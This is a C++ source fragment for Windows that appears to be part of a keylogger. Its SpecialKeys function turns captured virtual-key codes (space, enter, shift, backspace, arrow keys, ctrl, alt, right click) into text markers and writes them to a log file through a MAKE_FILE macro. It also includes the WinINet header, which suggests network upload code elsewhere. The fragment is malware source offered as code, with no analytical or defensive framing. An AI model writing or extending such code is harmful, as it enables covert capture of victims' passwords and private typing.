#include <bits/stdc++.h>
#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include "make_file.h"


using namespace std;

bool SpecialKeys(int S_Key) { //  capture some SpecialKeys https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

	switch (S_Key) {
	case VK_SPACE:
		
		MAKE_FILE(" ");
		return true;
	case VK_RETURN:
		
		MAKE_FILE("\n");
		return true;
	case '¾':
		
		MAKE_FILE(".");
		return true;
	case VK_SHIFT:
		MAKE_FILE("#SHIFT#");
		return true;
	case VK_BACK:
		MAKE_FILE("\b");
		return true;
	case VK_RBUTTON:
		MAKE_FILE("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		MAKE_FILE("#CAPS_LCOK");
		return true;
	case VK_TAB:
		MAKE_FILE("#TAB");
		return true;
	case VK_UP:
		MAKE_FILE("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		MAKE_FILE("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		MAKE_FILE("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		MAKE_FILE("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		MAKE_FILE("#CONTROL");
		return true;
	case VK_MENU:
		MAKE_FILE("#ALT");
		return true;
	default: 
		return false;
	} 
} 
